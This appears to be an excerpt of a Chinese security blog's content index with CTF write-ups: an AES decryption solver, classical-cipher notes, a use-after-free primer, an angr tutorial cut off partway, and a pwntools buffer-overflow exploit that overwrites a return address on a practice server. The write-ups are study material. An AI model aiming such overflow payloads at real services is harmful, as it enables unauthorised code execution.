class="number">0x05</span>,<span class="number">0x0b</span>,<span class="number">0x19</span>,<span class="number">0x17</span>,</span><br><span class="line">	<span class="number">0x76</span>,<span class="number">0x78</span>,<span class="number">0x6a</span>,<span class="number">0x64</span>,<span class="number">0x4e</span>,<span class="number">0x40</span>,<span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0x06</span>,<span class="number">0x08</span>,<span class="number">0x1a</span>,<span class="number">0x14</span>,<span class="number">0x3e</span>,<span class="number">0x30</span>,<span class="number">0x22</span>,<span class="number">0x2c</span>,</span><br><span class="line">	<span class="number">0x96</span>,<span class="number">0x98</span>,<span class="number">0x8a</span>,<span class="number">0x84</span>,<span class="number">0xae</span>,<span class="number">0xa0</span>,<span class="number">0xb2</span>,<span class="number">0xbc</span>,<span class="number">0xe6</span>,<span class="number">0xe8</span>,<span class="number">0xfa</span>,<span class="number">0xf4</span>,<span class="number">0xde</span>,<span class="number">0xd0</span>,<span class="number">0xc2</span>,<span class="number">0xcc</span>,</span><br><span class="line">	<span class="number">0x41</span>,<span class="number">0x4f</span>,<span class="number">0x5d</span>,<span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x77</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x31</span>,<span class="number">0x3f</span>,<span class="number">0x2d</span>,<span class="number">0x23</span>,<span class="number">0x09</span>,<span class="number">0x07</span>,<span class="number">0x15</span>,<span class="number">0x1b</span>,</span><br><span class="line">	<span class="number">0xa1</span>,<span class="number">0xaf</span>,<span class="number">0xbd</span>,<span class="number">0xb3</span>,<span class="number">0x99</span>,<span class="number">0x97</span>,<span class="number">0x85</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,<span class="number">0xdf</span>,<span class="number">0xcd</span>,<span class="number">0xc3</span>,<span class="number">0xe9</span>,<span class="number">0xe7</span>,<span class="number">0xf5</span>,<span class="number">0xfb</span>,</span><br><span class="line">	<span class="number">0x9a</span>,<span class="number">0x94</span>,<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0xa2</span>,<span class="number">0xac</span>,<span class="number">0xbe</span>,<span class="number">0xb0</span>,<span class="number">0xea</span>,<span class="number">0xe4</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0xd2</span>,<span class="number">0xdc</span>,<span class="number">0xce</span>,<span class="number">0xc0</span>,</span><br><span class="line">	<span class="number">0x7a</span>,<span class="number">0x74</span>,<span class="number">0x66</span>,<span class="number">0x68</span>,<span class="number">0x42</span>,<span class="number">0x4c</span>,<span class="number">0x5e</span>,<span class="number">0x50</span>,<span class="number">0x0a</span>,<span class="number">0x04</span>,<span class="number">0x16</span>,<span class="number">0x18</span>,<span class="number">0x32</span>,<span class="number">0x3c</span>,<span class="number">0x2e</span>,<span class="number">0x20</span>,</span><br><span class="line">	<span class="number">0xec</span>,<span class="number">0xe2</span>,<span class="number">0xf0</span>,<span class="number">0xfe</span>,<span class="number">0xd4</span>,<span class="number">0xda</span>,<span class="number">0xc8</span>,<span class="number">0xc6</span>,<span class="number">0x9c</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x8e</span>,<span class="number">0xa4</span>,<span class="number">0xaa</span>,<span class="number">0xb8</span>,<span class="number">0xb6</span>,</span><br><span class="line">	<span class="number">0x0c</span>,<span class="number">0x02</span>,<span class="number">0x10</span>,<span class="number">0x1e</span>,<span class="number">0x34</span>,<span class="number">0x3a</span>,<span class="number">0x28</span>,<span class="number">0x26</span>,<span class="number">0x7c</span>,<span class="number">0x72</span>,<span class="number">0x60</span>,<span class="number">0x6e</span>,<span class="number">0x44</span>,<span class="number">0x4a</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,</span><br><span class="line">	<span class="number">0x37</span>,<span class="number">0x39</span>,<span class="number">0x2b</span>,<span class="number">0x25</span>,<span class="number">0x0f</span>,<span class="number">0x01</span>,<span class="number">0x13</span>,<span class="number">0x1d</span>,<span class="number">0x47</span>,<span class="number">0x49</span>,<span class="number">0x5b</span>,<span class="number">0x55</span>,<span class="number">0x7f</span>,<span class="number">0x71</span>,<span class="number">0x63</span>,<span class="number">0x6d</span>,</span><br><span class="line">	<span class="number">0xd7</span>,<span class="number">0xd9</span>,<span class="number">0xcb</span>,<span class="number">0xc5</span>,<span class="number">0xef</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xfd</span>,<span class="number">0xa7</span>,<span class="number">0xa9</span>,<span class="number">0xbb</span>,<span class="number">0xb5</span>,<span class="number">0x9f</span>,<span class="number">0x91</span>,<span class="number">0x83</span>,<span class="number">0x8d</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_subWord</span>(<span class="params">byteArray</span>):</span><br><span class="line">	res = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> byteArray:</span><br><span class="line">		res.append( S_INV_BOX[b] )</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_subBytes</span>(<span class="params">aesState</span>):</span><br><span class="line">	resState = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(aesState),<span class="number">4</span>):</span><br><span class="line">		resState[i:i+<span class="number">4</span>] = inv_subWord(aesState[i:i+<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> resState</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_shiftRow</span>(<span class="params">aesState</span>):</span><br><span class="line">	resState = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	0 4 8 c        0 4 8 c</span></span><br><span class="line"><span class="string">	1 5 9 d        d 1 5 9</span></span><br><span class="line"><span class="string">	2 6 a e    -&gt;  a e 2 6</span></span><br><span class="line"><span class="string">	3 7 b f        7 b f 3</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">	newPosition = [ <span class="number">0</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">7</span>,</span><br><span class="line">					<span class="number">4</span>,   <span class="number">1</span>,  <span class="number">0xe</span>, <span class="number">0xb</span>,</span><br><span class="line">					<span class="number">8</span>,   <span class="number">5</span>,  <span class="number">2</span>, <span class="number">0xf</span>,</span><br><span class="line">					<span class="number">0xc</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span></span><br><span class="line">	]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> newPosition:</span><br><span class="line">		resState.append(aesState[i])</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> resState</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mixColumn</span>(<span class="params">aesState</span>):</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(aesState),<span class="number">4</span>):</span><br><span class="line">		b0, b1, b2, b3 = aesState[i:(i+<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">		new_b0 = GF_MULT_14[b0] ^ GF_MULT_11[b1] ^ GF_MULT_13[b2] ^ GF_MULT_09[b3]</span><br><span class="line">		new_b1 = GF_MULT_09[b0] ^ GF_MULT_14[b1] ^ GF_MULT_11[b2] ^ GF_MULT_13[b3]</span><br><span class="line">		new_b2 = GF_MULT_13[b0] ^ GF_MULT_09[b1] ^ GF_MULT_14[b2] ^ GF_MULT_11[b3]</span><br><span class="line">		new_b3 = GF_MULT_11[b0] ^ GF_MULT_13[b1] ^ GF_MULT_09[b2] ^ GF_MULT_14[b3]</span><br><span class="line"></span><br><span class="line">		res.append(new_b0) </span><br><span class="line">		res.append(new_b1) </span><br><span class="line">		res.append(new_b2) </span><br><span class="line">		res.append(new_b3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_Decryption</span>(<span class="params">cipherText, AES_key, nbRound</span>):</span><br><span class="line"></span><br><span class="line">	res = cipherText</span><br><span class="line"></span><br><span class="line">	res = inv_shiftRow(res)</span><br><span class="line"></span><br><span class="line">	res = inv_subBytes(res)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbRound-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">		res = inv_mixColumn(res)</span><br><span class="line"></span><br><span class="line">		res = inv_shiftRow(res)</span><br><span class="line"></span><br><span class="line">		res = inv_subBytes(res)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">	AES_Key = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">		cipherText = f_in.read()</span><br><span class="line">	</span><br><span class="line">	secondPlainText = AES_Decryption(cipherText, AES_Key,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(secondPlainText)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/09/12/ORCfl61uHcQt4hW.png" alt="image-20210912131804814"></p>
<p><code>SangFor&#123;cb4_k27&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RE</tag>
        <tag>writeup</tag>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF学习记录</title>
    <url>/2020/03/12/%E5%AD%A6%E4%B9%A0/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="0x01-Crypto"><a href="#0x01-Crypto" class="headerlink" title="0x01 Crypto"></a>0x01 Crypto</h2><h3 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h3><p>题目链接：<a href="https://buuoj.cn/files/3cc926e4d300e09c64cdfe79e9aafd6c/a6a57ad9-733a-46b3-b233-c932712e7c70.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEwM30.XmpJtA.dIAyc6lC0FaBOvD-nuV2Fok_e9M">点击获取</a></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>首先，需要了解什么是ROT。ROT是一种简单的替换算法，这种算法的主要加密方法是将所有明文密码同时左移或者右移某一长度，常见的是ROT13。ROT可以在二十六个字母之间替换，也可以在所有可见字符替换，如果没有指明是什么替换的话，全部试一遍也许是个不错的选择，运算量也不大。恺撒加密可以是为ROT的一种。</p>
<h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">83</span>, <span class="number">89</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">45</span>, <span class="number">86</span>, <span class="number">96</span>, <span class="number">45</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">136</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">132</span>, <span class="number">108</span>, <span class="number">128</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">123</span>,</span><br><span class="line">          <span class="number">111</span>, <span class="number">110</span>, <span class="number">127</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">108</span>, <span class="number">118</span>, <span class="number">128</span>, <span class="number">108</span>, <span class="number">131</span>, <span class="number">114</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">124</span>, <span class="number">113</span>, <span class="number">108</span>, <span class="number">76</span>,</span><br><span class="line">          <span class="number">76</span>, <span class="number">76</span>, <span class="number">76</span>, <span class="number">138</span>, <span class="number">23</span>, <span class="number">90</span>, <span class="number">81</span>, <span class="number">66</span>, <span class="number">71</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">65</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">63</span>, <span class="number">69</span>, <span class="number">61</span>, <span class="number">70</span>, <span class="number">114</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">69</span>,</span><br><span class="line">          <span class="number">67</span>, <span class="number">70</span>, <span class="number">63</span>, <span class="number">61</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">62</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">112</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line">    <span class="comment"># print hashlib.md5(flag).hexdigest()</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">                    <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(hashlib.md5(flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(</span><br><span class="line">                            d) + <span class="string">&quot;&#125;&quot;</span>).hexdigest()) == <span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span>:</span><br><span class="line">                        <span class="built_in">print</span> flag + <span class="built_in">chr</span>(a) + <span class="built_in">chr</span>(b) + <span class="built_in">chr</span>(c) + <span class="built_in">chr</span>(d)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i - j)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">    check()</span><br></pre></td></tr></table></figure>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>本来以为flag后面都是小写字母，所以一开始只跑了小写字母，跑了半天跑不出来，扩大范围后成功搞定：</p>
<p><a href=""><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312152838QQ%E6%88%AA%E5%9B%BE20200312232030.png" alt="img"></a></p>
<h3 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h3><p>题目链接：<a href="https://buuoj.cn/files/adf09f561e314b56e65728810c377035/7ce788ae-4e7e-4c30-b9b9-c558ad94f7c5.zip?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE4MH0.XmpVkw.BOqIrh67tkpxMQfO6eSXFRtCbwM">点击获取</a></p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>来自题目的提示，四面八方，提示四方密码。<strong>四方密码</strong>是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。 这种方法将字母两个一组，然后采用多字母替换密码。首先选择两个英文字作密匙，例如example和keyword。对于每一个密匙，将重复出现的字母去除，即example要转成exampl，然后将每个字母顺序放入矩阵，再将余下的字母顺序放入矩阵，便得出加密矩阵。<br>将这两个加密矩阵放在右上角和左下角，余下的两个角放a到z顺序的矩阵：<br>加密的步骤：</p>
<ol>
<li>两个字母一组地分开讯息：（例如hello world变成he ll ow or ld）；</li>
<li>找出第一个字母在左上角矩阵的位置；</li>
<li>同样道理，找第二个字母在右下角矩阵的位置；</li>
<li>找右上角矩阵中，和第一个字母同行，第二个字母同列的字母；</li>
<li>找左下角矩阵中，和第一个字母同列，第二个字母同行的字母；</li>
<li>得到的这两个字母就是加密过的讯息。</li>
<li>he lp me ob iw an ke no bi的加密结果：FY NF NE HW BX AF FO KH MD</li>
</ol>
<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_20031215365014902656863653.jpg!33.jpg" alt=""></p>
<h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p>自己动手画</p>
<h2 id="0x02-PWN"><a href="#0x02-PWN" class="headerlink" title="0x02 PWN"></a>0x02 PWN</h2><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>题目链接：<a href="https://buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016?token=eyJ1c2VyX2lkIjo1MTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5MH0.XmpYGw.FeTRtFI215Vnv-BJFYhg9Jlhp5g">点击获取</a></p>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>IDA打开之后，可以看到：</p>
<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155055QQ%E6%88%AA%E5%9B%BE20200312235011.png" alt=""></p>
<p>可以看到危险函数gets，常见的危险函数还有strcpy，strcat，sprintf。这些函数可以造成缓冲区溢出。简单的说，我们需要用数据填充缓冲区，覆盖返回地址，这样我们就可以控制代码执行。在这个程序中，存在一个构造好的函数，用于读取flag。</p>
<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312155906QQ%E6%88%AA%E5%9B%BE20200312235828.png" alt=""></p>
<p>这个地址也被输给我们了，所以我们只要确定到底要覆盖多长就行了。开启pwn-dbg调试。</p>
<p>我们可以用python的pwn模块下的cyclic函数构造一个比较长的字符串并输入，可以发现：</p>
<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png" alt=""></p>
<p>可以发现长度为72</p>
<p><img src="https://images.cnblogs.com/cnblogs_com/pw1scn/1668542/o_200312161025QQ%E6%88%AA%E5%9B%BE20200313000759.png" alt=""></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"><span class="comment">#p = pwn.process(&#x27;./warmup_csaw_2016&#x27;)</span></span><br><span class="line">p = pwn.remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26272</span>)</span><br><span class="line">elf = pwn.ELF(<span class="string">&#x27;./warmup_csaw_2016&#x27;</span>)</span><br><span class="line">assdr = <span class="number">0x40060d</span></span><br><span class="line">pwn.context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">pwn.context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>+pwn.p64(assdr)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
  </entry>
  <entry>
    <title>[PWNABLE.kr]uaf</title>
    <url>/2020/06/14/%E5%AD%A6%E4%B9%A0/PWNABLE-kr-uaf/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
<li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p>
</li>
<li><p>使用方式</p>
<ul>
<li>构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针</li>
</ul>
</li>
</ol>
<ul>
<li>构造数据填充被释放的内存区域<ul>
<li>再次调用该指针</li>
</ul>
</li>
</ul>
<ol>
<li><p>地址分配方式</p>
<p>在填充数据的时候，我们需要考虑到内存分配机制。我们要保证我们使用的数据能被分配到正确的地方去，所以需要了解一定的内存分配机制。</p>
</li>
</ol>
<h2 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h2><p>   一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
  </entry>
  <entry>
    <title>angr学习(1)</title>
    <url>/2021/09/05/%E5%AD%A6%E4%B9%A0/angr%E5%AD%A6%E4%B9%A0-1/</url>
    <content><![CDATA[<h1 id="angr学习"><a href="#angr学习" class="headerlink" title="angr学习"></a>angr学习</h1><p>angr是符号执行的工具</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Ubuntu：<br><code>sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</code><br>虚拟环境:<br><code>mkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr</code></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><a href="https://github.com/ch3cke/angr_ctf">题目库</a></p>
<h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">import random, os</span><br><span class="line">random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">userdef_charset = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">userdef = <span class="string">&#x27;&#x27;.join(random.choice(userdef_charset) for _ in range(8))</span></span><br><span class="line"><span class="string">&#125;$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#define USERDEF &quot;$&#123; userdef &#125;$&quot;</span></span><br><span class="line"><span class="string">#define LEN_USERDEF $&#123; write(len(userdef)) &#125;$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char msg[] =</span></span><br><span class="line"><span class="string">  &quot;$&#123; description &#125;$&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void print_msg() &#123;</span></span><br><span class="line"><span class="string">  printf(&quot;%s&quot;, msg);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int complex_function(int value, int i) &#123;</span></span><br><span class="line"><span class="string">#define LAMBDA 3</span></span><br><span class="line"><span class="string">  if (!(&#x27;</span>A<span class="number">&#x27;</span> &lt;= value &amp;&amp; value &lt;= <span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((value - <span class="string">&#x27;A&#x27;</span> + (LAMBDA * i)) % (<span class="string">&#x27;Z&#x27;</span> - <span class="string">&#x27;A&#x27;</span> + <span class="number">1</span>)) + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//print_msg();</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;LEN_USERDEF; ++i) &#123;</span><br><span class="line">    buffer[i] = complex_function(buffer[i], i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buffer, USERDEF)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good Job.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码的功能是输入数据，与一个全局变量进行比较，一样则输出<code>Good Job</code>,否则输出<code>try again</code>。</p>
<h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><p>反编译<br><img src="https://raw.githubusercontent.com/ch3cke/images/master/img/Clipboard_2021-09-05-15-07-59.png" alt=""><br>可以看到, <code>0x8048670</code>为bad_addr, <code>0x804867d</code> 为good_addr</p>
<h4 id="解决脚本"><a href="#解决脚本" class="headerlink" title="解决脚本"></a>解决脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载文件</span></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/00_angr_find/00_angr_find&#x27;</span>)</span><br><span class="line"><span class="comment"># auto_load_libc 是否加载库文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个状态</span></span><br><span class="line"><span class="comment"># entry_state() 构造一个已经准备好从函数入口点执行的状态</span></span><br><span class="line">stat = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Simulation Managers 模拟管理器</span></span><br><span class="line"><span class="comment"># 也可以改为</span></span><br><span class="line"><span class="comment"># sm = proj.factory.simulation_manager</span></span><br><span class="line"><span class="comment"># 区别不大</span></span><br><span class="line">sm = proj.factory.simgr(stat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># good = 0x0804867D</span></span><br><span class="line"><span class="comment"># 正确的路径</span></span><br><span class="line">good = <span class="keyword">lambda</span> s:<span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># angr开始探索这个路径</span></span><br><span class="line"><span class="comment"># 如果找到满足find的状态,则将其保存在模拟管理器的found里面</span></span><br><span class="line">sm.explore(find=good)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="comment"># 如果found分类不为空, 则说明找到了路径</span></span><br><span class="line">    find_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 将找到的状态给find_state</span></span><br><span class="line"></span><br><span class="line">flag = find_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(find_state.posix.dumps(<span class="number">1</span>)) <span class="comment"># 获取输入</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p>这个程序逻辑和上一个程序类似，不同的是函数体很大、</p>
